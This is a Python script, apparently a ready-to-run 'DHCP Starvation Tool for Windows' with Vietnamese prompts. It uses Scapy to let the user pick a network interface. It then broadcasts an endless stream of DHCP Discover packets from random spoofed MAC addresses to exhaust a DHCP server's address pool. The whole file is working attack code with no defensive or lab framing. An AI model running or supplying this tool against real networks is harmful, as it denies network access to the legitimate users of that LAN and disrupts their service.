from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.sendrecv import sendp
from scapy.arch.windows import get_windows_if_list
import random
import time

def random_mac():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(f"{x:02x}" for x in mac)

def mac2str(mac):
    return bytes.fromhex(mac.replace(":", "")) + b'\x00' * 10

def create_dhcp_discover(mac):
    ethernet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=mac2str(mac), xid=random.randint(1, 900000000), flags=0x8000)
    dhcp = DHCP(options=[("message-type", "discover"), "end"])
    return ethernet / ip / udp / bootp / dhcp

def select_interface():
    interfaces = get_windows_if_list()
    filtered = []

    print("=== Danh sách interface khả dụng ===\n")
    for idx, iface in enumerate(interfaces):
        name = iface.get("name", "Unknown")
        desc = iface.get("description", "")
        guid = iface.get("guid", "")
        if "Loopback" not in desc and "VMware" not in desc:  # bỏ Loopback/VM nếu cần
            filtered.append(iface)
            print(f"{len(filtered)-1}. {name} - {desc}")
    print()

    if not filtered:
        print("❌ Không tìm thấy interface hợp lệ.")
        exit(1)

    while True:
        try:
            choice = int(input("Nhập số tương ứng với interface bạn muốn dùng: "))
            if 0 <= choice < len(filtered):
                return filtered[choice]["name"]
            else:
                print("❌ Số không hợp lệ. Hãy thử lại.")
        except ValueError:
            print("❌ Vui lòng nhập một số.")

def main():
    print("=== DHCP Starvation Tool for Windows (LAN/PyCharm) ===\n")

    iface = select_interface()
    print(f"\n[*] Sử dụng interface: {iface}")
    print("[*] Đang gửi các gói DHCP Discover giả...\n")

    count = 0
    try:
        while True:
            mac = random_mac()
            packet = create_dhcp_discover(mac)
            sendp(packet, iface=iface, verbose=0)
            count += 1
            print(f"[{count}] ➤ Gửi DHCP Discover với MAC: {mac}")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] Dừng chương trình theo yêu cầu.")

if __name__ == "__main__":
    main()
